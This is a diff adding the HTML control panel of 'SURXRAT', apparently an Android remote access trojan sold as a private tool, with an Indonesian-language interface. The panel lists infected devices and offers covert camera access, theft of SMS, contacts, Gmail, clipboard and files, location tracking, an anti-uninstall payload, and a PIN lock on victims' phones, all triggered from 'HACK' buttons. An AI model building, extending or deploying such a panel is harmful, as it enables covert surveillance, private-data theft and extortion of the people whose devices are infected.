@@ -1,0 +1,3162 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SURXRAT V1.4 PRIVATE PRO</title>
+    <link rel="stylesheet" href="https://panel-penting-surxrat.vercel.app/floating-controls.css">
+    <link rel="stylesheet" href="https://panel-penting-surxrat.vercel.app/profile-layout.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Leaflet Maps (Real-time Tracking) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+        integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+        integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+
+    <!-- Asset Preloading for "Offline-like" Speed -->
+    <link rel="preload" as="image" href="https://panel-penting-surxrat.vercel.app/user.png">
+    <style>
+        /* Modern IOS Style Toggle Switch */
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 28px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.1);
+            transition: .4s;
+            border-radius: 34px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        input:checked+.slider {
+            background-color: #34C759;
+            /* iOS Green */
+            border-color: #34C759;
+        }
+
+        input:checked+.slider:before {
+            transform: translateX(22px);
+        }
+    </style>
+  <script type="module" crossorigin src="assets/index-0CLwk5Y_.js"></script>
+  <link rel="stylesheet" crossorigin href="assets/index-DuUNNjgO.css">
+</head>
+
+<body class="android-native" oncontextmenu="return false;">
+    <div class="bg-mesh"></div>
+    <div class="bg-blobs">
+        <div class="blob"></div>
+        <div class="blob"></div>
+        <div class="blob"></div>
+    </div>
+
+    <!-- Theme Background Music (Disabled) -->
+
+    <!-- Video Header Login (V1.7.5) -->
+    <!-- Video Header Login (V3.0 Fullscreen Blue) -->
+
+
+    <!-- Main Content Container (V5.0 Premium) -->
+    <div id="app-container" class="view hidden">
+        <!-- New Floating Header / HUD -->
+        <header class="premium-header">
+            <div class="hud-container">
+                <div class="hud-left">
+                    <button id="back-btn" class="hud-btn hidden">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="m15 18-6-6 6-6" />
+                        </svg>
+                    </button>
+                    <div id="hud-logo" class="hud-logo">
+                        <span class="logo-main">SURX<span class="hl">RAT</span></span>
+                    </div>
+                </div>
+
+                <div id="active-device-hud" class="hud-center hidden">
+                    <span id="hud-device-name">No Device</span>
+                    <div id="hud-battery-display" style="margin-left:8px;"></div>
+                </div>
+
+                <div class="hud-right">
+                    <div class="hud-badge">
+                        <span id="total-devices">0</span>
+                        <div class="hud-pulse"></div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- View 1: Device List -->
+        <div id="view-device-list" class="sub-view">
+            <div class="section-label">PERANGKAT TERHUBUNG</div>
+
+            <!-- NEW: Device Filters -->
+            <div style="padding: 0 16px 12px 16px;">
+                <input type="text" id="device-search-input" placeholder="Cari UID / Nama Perangkat..."
+                    onkeyup="filterDevices(this.value)"
+                    style="width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; outline: none; font-size: 0.9rem;">
+            </div>
+
+            <div class="device-filter-bar">
+                <button class="filter-btn active" onclick="setDeviceFilter('all')">
+                    SEMUA <span id="count-all">0</span>
+                </button>
+                <button class="filter-btn" onclick="setDeviceFilter('online')">
+                    ONLINE <span id="count-online">0</span>
+                </button>
+                <button class="filter-btn" onclick="setDeviceFilter('offline')">
+                    OFFLINE <span id="count-offline">0</span>
+                </button>
+                <button class="filter-btn" onclick="setDeviceFilter('favorit')">
+                    FAVORIT <span id="count-favorit">0</span>
+                </button>
+            </div>
+
+            <div id="device-loader" class="cyber-loader hidden">
+                <div class="cyber-spinner"></div>
+                <div class="loader-status">MEMULAI SISTEM SURXRAT...</div>
+                <div class="loader-count" id="loader-count">0/0</div>
+                <div class="loader-subtext">JANGAN KELUAR APLIKASI, SEDANG MENYAMBUNGKAN...</div>
+
+                <div class="progress-container">
+                    <div class="progress-bar" id="loader-progress"></div>
+                </div>
+                <div class="est-time" id="loader-est">MENGECEK SERVER...</div>
+            </div>
+            <div id="device-list" class="native-list"></div>
+        </div>
+
+        <div id="view-feature-menu" class="sub-view hidden">
+            <!-- PREMIUM: Device Info Profile Card -->
+            <div id="device-profile-card" class="profile-card-mini hidden">
+                <div class="profile-card-header">
+                    <div class="profile-card-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5">
+                            <rect x="5" y="2" width="14" height="20" rx="3" ry="3"></rect>
+                            <path d="M12 18h.01"></path>
+                        </svg>
+                    </div>
+                    <div class="profile-card-title-group">
+                        <div class="profile-card-title">Profil Perangkat <span class="status-dot"></span></div>
+                        <div class="profile-card-subtitle">Real-time update active</div>
+                    </div>
+                </div>
+                <div class="profile-card-grid">
+                    <div class="pc-item">
+                        <span class="pc-label">Model</span>
+                        <span id="pc-device" class="pc-value">-</span>
+                    </div>
+                    <div class="pc-item">
+                        <span class="pc-label">Battery Level</span>
+                        <span id="pc-battery" class="pc-value">-</span>
+                    </div>
+                    <div class="pc-item full">
+                        <span class="pc-label">Network Type</span>
+                        <span id="pc-network" class="pc-value">-</span>
+                    </div>
+                    <div class="pc-item full">
+                        <span class="pc-label">SIM SLOT 1</span>
+                        <div id="pc-sim1" class="pc-value">No SIM</div>
+                    </div>
+                    <div class="pc-item full">
+                        <span class="pc-label">SIM SLOT 2</span>
+                        <div id="pc-sim2" class="pc-value">No SIM</div>
+                    </div>
+                    <!-- NEW: Anti-Uninstall Toggle (Re-Designed) -->
+                    <div class="pc-item full"
+                        style="flex-direction: column; align-items: center; gap: 12px; padding: 20px; background: rgba(255, 69, 58, 0.08); border: 1px solid rgba(255, 69, 58, 0.3);">
+                        <span class="pc-label"
+                            style="font-size: 1.2rem; letter-spacing: 2px; text-align: center; width: 100%; color: #ff453a; font-weight: 900; margin-bottom: 8px;">
+                            ANTI-UNINSTALL PAYLOAD
+                        </span>
+                        <div
+                            style="display: flex; align-items: center; justify-content: center; gap: 20px; width: 100%;">
+                            <span id="pc-anti-uninstall-status" class="pc-value"
+                                style="font-size: 1rem; font-weight: bold; color: #888;">...</span>
+                            <label class="toggle-switch" style="transform: scale(1.4);">
+                                <input type="checkbox" id="pc-anti-uninstall-toggle"
+                                    onchange="toggleAntiUninstall(this.checked)">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-label">AKSI PERANGKAT</div>
+            <div class="feature-grid">
+                <!-- NEW: Stealth Camera -->
+                <div class="feature-card" onclick="openFeature('camera')" style="border-color: rgba(255, 59, 48, 0.4);">
+                    <div class="feature-icon" style="color: #FF3B30;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z">
+                            </path>
+                            <circle cx="12" cy="13" r="4"></circle>
+                        </svg>
+                    </div>
+                    <span>Kamera</span>
+                </div>
+
+                <div class="feature-card" onclick="openFeature('sms-baru')">
+                    <div class="feature-icon" style="color: var(--accent-blue);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+                        </svg>
+                    </div>
+                    <span>Sms Baru</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('old')">
+                    <div class="feature-icon" style="color: var(--accent-red);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                            <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
+                        </svg>
+                    </div>
+                    <span>Sms Lama</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('con')">
+                    <div class="feature-icon" style="color: var(--accent-green);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
+                            <circle cx="9" cy="7" r="4" />
+                            <path d="M22 21v-2a4 4 0 0 0-3-3.87" />
+                            <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                        </svg>
+                    </div>
+                    <span>Kontak</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('call')">
+                    <div class="feature-icon" style="color: var(--accent-orange);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path
+                                d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                        </svg>
+                    </div>
+                    <span>Panggilan</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('inf')">
+                    <div class="feature-icon" style="color: #8E8E93;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect width="20" height="20" x="2" y="2" rx="5" ry="5" />
+                            <path d="M12 18h.01" />
+                            <path d="M7 21h10" />
+                            <path d="M9 16V8h3" />
+                            <path d="M12 8c1.66 0 3 1.34 3 3s-1.34 3-3 3" />
+                        </svg>
+                    </div>
+                    <span>Sistem</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('email')">
+                    <div class="feature-icon" style="color: #FF2D55;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+                            <polyline points="22,6 12,13 2,6" />
+                        </svg>
+                    </div>
+                    <span>Gmail</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('location')">
+                    <div class="feature-icon" style="color: var(--accent-cyan);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
+                            <circle cx="12" cy="10" r="3" />
+                        </svg>
+                    </div>
+                    <span>Lokasi</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('net')">
+                    <div class="feature-icon" style="color: #FFCC00;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+                            <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+                            <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+                            <line x1="12" y1="20" x2="12.01" y2="20"></line>
+                        </svg>
+                    </div>
+                    <span>Jaringan</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('notif')">
+                    <div class="feature-icon" style="color: #00FF88;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                        </svg>
+                    </div>
+                    <span>Notifikasi</span>
+                </div>
+                <!-- Clipboard Monitor -->
+                <div class="feature-card" onclick="openFeature('clipboard')"
+                    style="border-color: rgba(255, 0, 51, 0.4);">
+                    <div class="feature-icon" style="color: #FF0033;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path>
+                            <rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect>
+                        </svg>
+                        <div class="pulse-badge" style="background:#FF0033"></div>
+                    </div>
+                    <span>Clipboard</span>
+                </div>
+                <!-- Apps -->
+                <div class="feature-card" onclick="openFeature('app')">
+                    <div class="feature-icon" style="color: #5856D6;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="14" width="7" height="7"></rect>
+                            <rect x="3" y="14" width="7" height="7"></rect>
+                        </svg>
+                    </div>
+                    <span>Aplikasi</span>
+                </div>
+                <!-- Browser History -->
+                <div class="feature-card" onclick="openFeature('brow')">
+                    <div class="feature-icon" style="color: #FF9500;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <polyline points="12 6 12 12 16 14"></polyline>
+                        </svg>
+                    </div>
+                    <span>Akses payload</span>
+                </div>
+                <!-- WiFi & Cell History -->
+                <div class="feature-card" onclick="openFeature('cell')">
+                    <div class="feature-icon" style="color: #AF52DE;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M2 20h.01"></path>
+                            <path d="M7 20v-4h.01"></path>
+                            <path d="M12 20v-8h.01"></path>
+                            <path d="M17 20V8h.01"></path>
+                            <path d="M22 20V4h.01"></path>
+                        </svg>
+                    </div>
+                    <span>Cell Tower</span>
+                </div>
+                <!-- WiFi Scan -->
+                <div class="feature-card" onclick="openFeature('wifis')">
+                    <div class="feature-icon" style="color: #FF0033;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+                            <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+                            <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+                            <line x1="12" y1="20" x2="12.01" y2="20"></line>
+                        </svg>
+                    </div>
+                    <span>WiFi Scan</span>
+                </div>
+                <!-- WiFi History -->
+                <div class="feature-card" onclick="openFeature('wifih')">
+                    <div class="feature-icon" style="color: #FF0033;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 20h.01"></path>
+                            <path d="M2 10s3-3 10-3 10 3 10 3"></path>
+                            <path d="M5 13s2-1.5 7-1.5 7 1.5 7 1.5"></path>
+                            <path d="M8.5 16s1.5-1 3.5-1 3.5 1 3.5 1"></path>
+                            <circle cx="12" cy="12" r="10" opacity="0.1"></circle>
+                        </svg>
+                    </div>
+                    <span>WiFi History</span>
+                </div>
+                <div class="feature-card" onclick="openFeature('fm')" style="border-color: rgba(255, 45, 85, 0.4);">
+                    <div class="feature-icon" style="color: #FF2D55;">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z">
+                            </path>
+                        </svg>
+                    </div>
+                    <span>File Manager</span>
+                </div>
+                <div class="feature-card" onclick="toggleControlMenu()">
+                    <div class="feature-icon" style="color: var(--accent-purple);">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="1" />
+                            <circle cx="19" cy="12" r="1" />
+                            <circle cx="5" cy="12" r="1" />
+                            <circle cx="12" cy="5" r="1" />
+                            <circle cx="12" cy="19" r="1" />
+                            <circle cx="19" cy="5" r="1" />
+                            <circle cx="5" cy="5" r="1" />
+                            <circle cx="19" cy="19" r="1" />
+                            <circle cx="5" cy="19" r="1" />
+                        </svg>
+                    </div>
+                    <span>Kontrol</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- View 3: Data Detail Sheet -->
+        <div id="view-data-detail" class="sub-view hidden">
+            <div id="detail-content" class="native-detail-container">
+                <!-- Detailed table/list will be injected here -->
+            </div>
+        </div>
+
+        <!-- View: File Manager -->
+        <div id="view-file-manager" class="sub-view hidden">
+            <div class="section-label">FILE MANAGER PRO</div>
+            <div id="fm-path-bar"
+                style="margin: 10px 15px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 12px; font-size: 0.85rem; color: #aaa; word-break: break-all; display: flex; align-items: center; gap: 8px; border: 1px solid rgba(255,255,255,0.1);">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                </svg>
+                <span id="fm-current-path">/sdcard</span>
+            </div>
+
+            <!-- FM Loader -->
+            <div id="fm-loader" class="loader hidden" style="background:transparent; padding: 20px 0;">
+                <div class="spinner"></div>
+                <p>Memuat file...</p>
+            </div>
+
+            <div id="fm-list" class="native-list" style="padding-bottom: 150px;">
+                <!-- Files will be injected here -->
+            </div>
+        </div>
+
+        <!-- View 4: Profile View (CLEAN LAYOUT) -->
+        <div id="view-profile" class="sub-view hidden">
+            <!-- Profile Section -->
+            <div id="section-profile" class="profile-section">
+                <!-- Action Buttons: Top Right Logout -->
+                <button id="logout-btn-profile" class="logout-btn-circle">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                        <polyline points="16 17 21 12 16 7"></polyline>
+                        <line x1="21" y1="12" x2="9" y2="12"></line>
+                    </svg>
+                </button>
+
+                <div class="profile-header">
+                    <div class="profile-avatar">
+                        <img src="assets/user-DZZwrExu.jpg" alt="Profile">
+                    </div>
+                    <h2 id="prof-username">Selamat datang...</h2>
+                </div>
+
+                <div class="profile-list">
+                    <div class="profile-item">
+                        <div class="prof-label">EMAIL</div>
+                        <div id="prof-email" class="prof-value">-</div>
+                    </div>
+
+                    <div class="profile-item">
+                        <div class="prof-label">TANGGAL</div>
+                        <div id="prof-created" class="prof-value">-</div>
+                    </div>
+                    <div class="profile-item">
+                        <div class="prof-label">ID</div>
+                        <div class="prof-id-row">
+                            <div id="prof-uid" class="prof-value">...</div>
+                            <button id="copy-uid-btn" class="copy-btn">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
+                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Change Password Button (Premium Style - Redesigned) -->
+                <div class="profile-item" style="margin-top: 20px; border: none; background: transparent; padding: 0;">
+                    <button onclick="openChangePasswordModal()" class="hack-btn" style="
+                        width: 100%; 
+                        display: flex; 
+                        align-items: center; 
+                        justify-content: center; 
+                        gap: 12px;
+                        background: rgba(0, 255, 136, 0.1); 
+                        border: 1px solid var(--accent-green); 
+                        color: var(--accent-green);
+                        font-weight: 700;
+                        letter-spacing: 1px;
+                    ">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        UBAH PASSWORD
+                    </button>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+    <!-- Premium Floating Dock -->
+    <nav class="premium-dock">
+        <div id="nav-list" class="dock-item active" onclick="navigate('list')">
+            <div class="dock-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                </svg>
+            </div>
+            <span>Beranda</span>
+        </div>
+
+        <div id="nav-control" class="dock-item control-dock-btn" onclick="toggleControlMenu()" style="display: none;">
+            <div class="dock-icon-main">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <circle cx="12" cy="12" r="1"></circle>
+                    <circle cx="19" cy="12" r="1"></circle>
+                    <circle cx="5" cy="12" r="1"></circle>
+                    <circle cx="12" cy="5" r="1"></circle>
+                    <circle cx="12" cy="19" r="1"></circle>
+                    <circle cx="19" cy="5" r="1"></circle>
+                    <circle cx="5" cy="5" r="1"></circle>
+                    <circle cx="19" cy="19" r="1"></circle>
+                    <circle cx="5" cy="19" r="1"></circle>
+                </svg>
+            </div>
+            <span>Kontrol</span>
+        </div>
+
+        <div id="nav-profile" class="dock-item" onclick="navigate('profile')">
+            <div class="dock-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                </svg>
+            </div>
+            <span>Profil</span>
+        </div>
+    </nav>
+    </div>
+
+    <!-- NEW: Realtime Control Modal (Overlay) -->
+    <div id="realtime-modal" class="modal-overlay hidden">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Fitur RealTime</h3>
+                <button id="close-modal-btn" class="close-btn">&times;</button>
+            </div>
+            <div class="modal-list">
+            </div>
+
+
+
+
+
+
+            <!-- Vibration with Duration Input -->
+            <div class="modal-item">
+                <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2">
+                        <path d="M12 2a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1 1 1 0 0 1-1-1V3a1 1 0 0 1 1-1z"></path>
+                        <path d="M3 11h18"></path>
+                        <path d="M4.93 4.93l14.14 14.14"></path>
+                        <path d="M19.07 4.93L4.93 19.07"></path>
+                    </svg></div>
+                <div class="mi-content">
+                    <div class="mi-label">Getarkan Perangkat</div>
+                    <input type="number" id="input-vib" class="mi-input" placeholder="Durasi (detik)" value="1">
+                </div>
+                <button class="hack-btn" onclick="sendControl('vib')">HACK</button>
+            </div>
+
+            <!-- Toast with Text Input -->
+            <div class="modal-item">
+                <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2">
+                        <path
+                            d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z">
+                        </path>
+                    </svg></div>
+                <div class="mi-content">
+                    <div class="mi-label">Teks Layar (Toast)</div>
+                    <input type="text" id="input-toast" class="mi-input" placeholder="Masukkan teks..."
+                        value="Halo dari SURXRAT!">
+                </div>
+                <button class="hack-btn" onclick="sendControl('toast')">HACK</button>
+            </div>
+
+            <!-- TTS (Voice) with Text Input -->
+            <div class="modal-item">
+                <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2">
+                        <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path>
+                        <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
+                        <line x1="12" y1="19" x2="12" y2="23"></line>
+                        <line x1="8" y1="23" x2="16" y2="23"></line>
+                    </svg></div>
+                <div class="mi-content">
+                    <div class="mi-label">Kirim Suara Google (TTS)</div>
+                    <input type="text" id="input-voi" class="mi-input" placeholder="Masukkan teks suara..."
+                        value="Halo, ini pesan dari Google">
+                </div>
+                <button class="hack-btn" onclick="sendControl('voi')">HACK</button>
+            </div>
+
+            <!-- Lock Device -->
+            <div class="modal-item">
+                <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg></div>
+                <div class="mi-content">
+                    <div class="mi-label">🔒 Lock Device</div>
+                    <input type="text" id="input-lock-msg" class="mi-input" placeholder="Lock message..."
+                        value="Device terkunci!">
+                    <input type="number" id="input-lock-pin" class="mi-input" style="margin-top:8px;" placeholder="PIN"
+                        value="1234" maxlength="6">
+                    <div class="mi-desc">💡 Kunci penuh sampai PIN benar</div>
+
+                    <!-- Background Option -->
+                    <div style="margin-top: 12px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 8px;">
+                        <div class="mi-label" style="font-size: 0.8rem; color: #aaa; margin-bottom: 4px;">Background
+                            Style</div>
+                        <select id="select-lock-bg-type" class="mi-input" style="margin-bottom: 4px;"
+                            onchange="document.getElementById('input-lock-url').style.display = (this.value === 'url' ? 'block' : 'none')">
+                            <option value="black">Hitam (Default)</option>
+                            <option value="url">Custom Foto (URL)</option>
+                        </select>
+                        <input type="url" id="input-lock-url" class="mi-input" style="display: none;"
+                            placeholder="https://link-gambar.com/foto.jpg">
+                    </div>
+                    <button class="hack-btn" onclick="sendLockCommand()">LOCK</button>
+                </div>
+
+
+                <!-- Call with Phone Number Input -->
+                <div class="modal-item">
+                    <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <path
+                                d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z">
+                            </path>
+                        </svg></div>
+                    <div class="mi-content">
+                        <div class="mi-label">Panggil Nomor</div>
+                        <input type="tel" id="input-cal" class="mi-input" placeholder="Masukkan nomor telepon..."
+                            value="+628123456789">
+                    </div>
+                    <button class="hack-btn" onclick="sendControl('cal')">HACK</button>
+                </div>
+
+                <!-- Wallpaper with URL Input -->
+                <div class="modal-item">
+                    <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                            <polyline points="21 15 16 10 5 21"></polyline>
+                        </svg></div>
+                    <div class="mi-content">
+                        <div class="mi-label">Ubah Wallpaper</div>
+                        <input type="url" id="input-wal" class="mi-input" placeholder="URL gambar wallpaper..."
+                            value="https://picsum.photos/1080/1920">
+                    </div>
+                    <button class="hack-btn" onclick="sendControl('wal')">HACK</button>
+                </div>
+
+                <!-- Music with URL Input -->
+                <div class="modal-item">
+                    <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <path d="M9 18V5l12-2v13"></path>
+                            <circle cx="6" cy="18" r="3"></circle>
